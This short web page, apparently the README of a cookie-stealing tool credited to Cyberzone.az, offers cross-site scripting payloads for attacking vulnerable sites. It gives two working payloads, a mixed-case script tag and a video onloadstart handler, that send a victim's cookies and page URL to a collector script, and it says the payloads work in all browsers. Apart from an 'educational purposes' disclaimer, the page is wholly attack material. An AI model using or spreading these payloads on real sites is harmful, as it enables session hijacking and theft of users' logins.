<h2>For educational purposes only, use at your own responsibility.</h2>

<p>This script gets  all cookies, ip address and url from vulnerable site and stores it in data.txt.</p>

<p>Here same payload examples for usage.</p>
<sCRiPt>new Image().src=`https://localhost/getCookies.php?u=${document.location.href}&c=${document.cookie}`;</sCRiPt>
<video autoplay onloadstart="new Image().src=`https://localhost/getCookies.php?u=${document.location.href}&c=${document.cookie}`;" src=x></video>

<p>These examples in above is written for bypassing cross site origin policy in all browsers but you can use your own payload instead.</p>

From: Cyberzone.az